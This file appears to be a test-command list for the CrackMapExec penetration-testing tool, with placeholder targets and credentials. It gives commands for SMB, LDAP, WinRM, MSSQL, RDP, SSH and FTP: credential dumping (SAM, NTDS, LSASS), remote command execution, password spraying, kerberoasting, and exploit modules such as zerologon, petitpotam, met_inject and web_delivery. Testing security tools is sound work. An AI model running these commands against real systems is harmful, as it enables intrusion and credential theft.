# crackmapexec-commands



##### SMB<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS # need an extra space after this command due to regex<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --shares<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --shares --filter-shares READ WRITE<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --pass-pol<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --disks<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --groups<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --sessions<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --loggedon-users<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --users<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --computers<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --rid-brute<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --local-groups<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --gen-relay-list /tmp/relaylistOutputFilename.txt<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --local-auth<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --sam<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --ntds<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --lsa<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --dpapi<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -x whoami<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -X whoami<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -X whoami --obfs<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --wmi &quot;select Name from win32_computersystem&quot;<br>
##### SMB Modules<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -L<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M bh_owned<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M dfscoerce<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M drop-sc<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M drop-sc --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M drop-sc -o CLEANUP=True<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M empire_exec -o LISTENER=http-listener<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M empire_exec -o LISTENER=http-listener OBFUSCATE=True<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M enum_av<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M enum_dns<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M enum_dns --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M enum_dns -o DOMAIN=google.com<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M firefox<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M get_netconnections<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M gpp_autologin<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M gpp_password<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M handlekatz<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M handlekatz --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M handlekatz -o HANDLEKATZ_EXE_NAME=&quot;hk.exe&quot;<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M hash_spider<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M impersonate<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M install_elevated<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M ioxidresolver<br>
# currently hanging indefinitely - TODO: look into this<br>
#crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M keepass_discover<br>
#crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M keepass_trigger -o ACTION=ALL USER=USERNAME KEEPASS_CONFIG_PATH=&quot;C:\\Users\\USERNAME\\AppData\\Roaming\\KeePass\\KeePass.config.xml&quot;<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M lsassy<br>
# You must replace this with the proper CA information!<br>
#crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M masky -o CA=&quot;host.domain.tld\domain-host-CA&quot;<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M met_inject -o SRVHOST=127.0.0.1 SRVPORT=4444 RAND=12345<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M ms17-010<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M msol<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M nanodump<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M nopac<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M ntdsutil<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M ntlmv1<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M petitpotam<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M procdump<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M rdcman<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M rdp --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M rdp -o ACTION=enable<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M rdp -o ACTION=disable<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M reg-query -o PATH=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion KEY=DevicePath<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M runasppl<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M scuffy -o SERVER=127.0.0.1 NAME=test<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M scuffy -o NAME=test CLEANUP=True<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M shadowcoerce<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M slinky -o SERVER=127.0.0.1 NAME=test<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M slinky -o NAME=test CLEANUP=True<br>
# spider_plus takes a while to run, so it is commented out during normal testing<br>
# crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M spider_plus -o MAX_FILE_SIZE=100<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M spooler<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M teams_localdb<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M test_connection --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M test_connection -o HOST=localhost<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M uac<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M veeam<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M wdigest --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M wdigest -o ACTION=enable<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M wdigest -o ACTION=disable<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M web_delivery --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M web_delivery -o URL=localhost/dl_cradle<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M webdav<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M webdav --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M webdav -o MSG=&quot;Message: {}&quot;<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M wifi<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M winscp<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M zerologon<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M spooler -M petitpotam -M zerologon -M nopac -M dfscoerce -M enum_av -M enum_dns -M gpp_autologin -M gpp_password -M lsassy -M impersonate -M install_elevated -M ioxidresolver -M ms17-010 -M ntlmv1 -M runasppl -M shadowcoerce -M uac -M webdav -M wifi<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M bh_owned --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M dfscoerce --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M empire_exec --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M enum_av --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M firefox --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M get_netconnections --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M gpp_autologin --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M gpp_password --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M hash_spider --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M impersonate --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M install_elevated --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M ioxidresolver --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M keepass_discover --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M keepass_trigger --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M lsassy --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M masky --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M met_inject --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M ms17-010 --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M msol --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M nanodump --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M nopac --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M ntdsutil --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M ntlmv1 --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M petitpotam --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M procdump --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M rdcman --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M reg-query --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M runasppl --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M scuffy --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M shadowcoerce --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M slinky --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M spider_plus --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M spooler --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M teams_localdb --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M uac --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M veeam --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M wifi --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M winscp --options<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M zerologon --options<br>
##### SMB Anonymous Auth<br>
crackmapexec smb TARGET_HOST -u '' -p '' -M zerologon<br>
crackmapexec smb TARGET_HOST -u '' -p '' -M petitpotam<br>
##### SMB Auth File<br>
crackmapexec smb TARGET_HOST -u data/test_users.txt -p test_passwords.txt --no-bruteforce<br>
crackmapexec smb TARGET_HOST -u data/test_users.txt -p test_passwords.txt --no-bruteforce --continue-on-success<br>
crackmapexec smb TARGET_HOST -u data/test_users.txt -p test_passwords.txt<br>
##### LDAP<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --users<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --groups<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --get-sid<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p '' --asreproast /tmp/output.txt<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --kerberoasting /tmp/output2.txt<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --trusted-for-delegation<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --admin-count<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --gmsa<br>
##### LDAP Modules<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -L<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M adcs<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M adcs --options<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M daclread -o TARGET=USERNAME ACTION=read<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M daclread --options<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M get-desc-users<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M get-desc-users --options<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M get-network<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M get-network --options<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M groupmembership --options<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M groupmembership -o USER=USERNAME<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M laps<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M laps --options<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M ldap-checker<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M ldap-checker --options<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M maq<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M maq --options<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M subnets<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M subnets --options<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M user-desc<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M user-desc --options<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M whoami<br>
crackmapexec ldap TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M whoami --options<br>
##### WINRM<br>
crackmapexec winrm TARGET_HOST -u USERNAME -p PASSWORD KERBEROS # need an extra space after this command due to regex<br>
crackmapexec winrm TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -X whoami<br>
crackmapexec winrm TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --laps<br>
crackmapexec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS<br>
##### MSSQL<br>
crackmapexec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS<br>
##### MSSQL Modules<br>
# crackmapexec mssql TARGET_HOST -u USERNAME -p PASSWORD -M empire_exec<br>
crackmapexec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -L<br>
crackmapexec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M met_inject -o SRVHOST=127.0.0.1 SRVPORT=4444 RAND=12345<br>
crackmapexec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M met_inject --options<br>
crackmapexec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M mssql_priv<br>
crackmapexec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M mssql_priv --options<br>
crackmapexec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M nanodump<br>
crackmapexec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M nanodump --options<br>
crackmapexec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M test_connection --options<br>
crackmapexec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M test_connection -o HOST=localhost<br>
crackmapexec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M web_delivery --options<br>
crackmapexec mssql TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M web_delivery -o URL=localhost/dl_cradle<br>
# a bit janky, but we try to enable RDP before testing RDP<br>
crackmapexec smb TARGET_HOST -u USERNAME -p PASSWORD KERBEROS -M rdp -o ACTION=enable<br>
##### RDP<br>
crackmapexec rdp TARGET_HOST -u USERNAME -p PASSWORD KERBEROS # need an extra space after this command due to regex<br>
crackmapexec rdp TARGET_HOST -u USERNAME -p PASSWORD KERBEROS --nla-screenshot<br>
##### SSH - Default test passwords and random key; switch these out if you want correct authentication<br>
crackmapexec ssh TARGET_HOST -u USERNAME -p PASSWORD<br>
crackmapexec ssh TARGET_HOST -u data/test_users.txt -p test_passwords.txt --no-bruteforce<br>
crackmapexec ssh TARGET_HOST -u data/test_users.txt -p test_passwords.txt --no-bruteforce --continue-on-success<br>
crackmapexec ssh TARGET_HOST -u data/test_users.txt -p test_passwords.txt<br>
crackmapexec ssh TARGET_HOST -u USERNAME -p PASSWORD --key-file data/test_key.priv<br>
crackmapexec ssh TARGET_HOST -u USERNAME -p '' --key-file data/test_key.priv<br>
##### FTP- Default test passwords and random key; switch these out if you want correct authentication<br>
crackmapexec ftp TARGET_HOST -u USERNAME -p PASSWORD<br>
crackmapexec ftp TARGET_HOST -u USERNAME -p PASSWORD --ls<br>
crackmapexec ftp TARGET_HOST -u data/test_users.txt -p test_passwords.txt --no-bruteforce<br>
crackmapexec ftp TARGET_HOST -u data/test_users.txt -p test_passwords.txt --no-bruteforce --continue-on-success<br>
crackmapexec ftp TARGET_HOST -u data/test_users.txt -p test_passwords.txt
